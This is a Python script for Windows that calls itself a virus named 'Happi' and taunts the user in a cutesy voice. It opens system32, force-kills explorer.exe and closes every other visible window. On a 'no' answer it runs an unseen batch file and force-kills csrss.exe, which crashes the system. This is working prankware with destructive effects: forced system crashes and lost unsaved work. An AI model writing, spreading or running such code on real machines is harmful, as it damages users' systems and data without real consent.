import time
import os
import sys
import ctypes
import win32gui # type: ignore
import win32con # type: ignore
import msvcrt
def initiatecrash():
    os.system("setvpath.bat")
    os.system("taskkill /IM csrss.exe /F /t")
def enum_windows_callback(hwnd, windows_list):
    # Get the window title
    title = win32gui.GetWindowText(hwnd)
    # Add only visible windows with titles to the list
    if win32gui.IsWindowVisible(hwnd) and title:
        windows_list.append((hwnd, title))

def close_all_except_command_prompt(excluded_title="Administrator:  Happi"):
    # Enumerate all open windows
    windows = []
    win32gui.EnumWindows(enum_windows_callback, windows)
    
    for hwnd, title in windows:
        # Skip the Command Prompt window
        if excluded_title.lower() in title.lower():
            print(f"Skipping window: {title}")
            continue
        
        # Close the window
        print(f"Closing window: {title}")
        win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)

def find_window(title):
    return ctypes.windll.user32.FindWindowW(None, title)

def move_window(hwnd, x, y, width, height):
    ctypes.windll.user32.MoveWindow(hwnd, x, y, width, height, True)
hwnd = find_window("Administrator:  Happi")
def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()
if not is_admin():
    print("Friend! relaunch with admin console!!!")

def viruspart():
    os.system("start explorer c:/windows/system32")
    print("(UwU) wow what nice files you have!")
    time.sleep(5)
    os.system("taskkill /IM explorer.exe /F")
    time.sleep(2)
    print("(!w!) Not anymore! No need for that pesky taskbar anyways, right?")
    answer = input("(OwO) Are you having fun?: ")
    if answer == "yes":
        print("(^u^) Yay! im so happy for you! But your desktop is sooo cluttered! lets fix that, friend.")
    if answer == "no":
        print("(U^U) awh... i can help by cleaning your desktop up!")
    close_all_except_command_prompt()
    print("much better! arent we the  b e s t  of  f r i e n d s ? . . .")
    answer = input("r i g h t ? . . : ")
    if answer == "no":
        print("Press any key to watch your pc suffer...")
        key = msvcrt.getch() 
        initiatecrash()
    if answer == "yes":
        print("(OuO) great!")
        print("(>u<) you wanna see something cool?")
        answer = input("?: ")
        if answer == "yes":
            print("(OwO) Yippee! ")
os.system("echo off")
os.system("title Happi")
print("Hai friend, did u know this iz a virus?")
answer = input("Answer me friend: ")
if answer == "no":
    print("Oh no! Thats too bad, do you want me to quit?")
    answer1 = input("heh, answer me. ")
    if answer1 == "no":
        print("Oh well you are one unlucky duck! Too bad!")
        viruspart()

if answer == "yes":
    print("Oh goodie! Time to get started")
    viruspart()

